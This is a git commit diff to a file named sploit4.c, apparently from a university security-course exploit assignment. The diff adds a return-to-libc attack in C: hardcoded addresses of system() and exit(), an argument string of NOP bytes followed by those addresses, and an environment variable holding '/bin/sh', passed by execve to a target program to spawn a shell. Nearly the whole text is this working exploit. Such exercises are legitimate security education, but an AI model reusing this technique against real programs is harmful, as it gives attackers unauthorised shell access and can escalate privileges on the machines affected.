d5e9f534e907b741f75e79814dc80f1e89a1083c
Adam Levin <awl44@me.com>
2019-11-30 00:54:44 -0800

    sploooit4

--- sploits/sploit4.c
+++ sploits/sploit4.c
@@ -11,12 +11,18 @@ int main(void)
 {
   char *args[3]; 
   char *env[1];
-  
+
+  // system 0xb7e43da0
+  // exit 0xb7e379d0
+  // envvar 0xbfffffc5
+
   args[0] = TARGET;
-  args[1] = "student"; 
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\xa0\x3d\xe4\xb7\xd0\x79\xe3\xb7\xc5\xff\xff\xbf"; 
   args[2] = NULL;
+
+  char *envvar = "shellcode=/bin/sh";
   
-  env[0] = NULL;
+  env[0] = envvar;
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
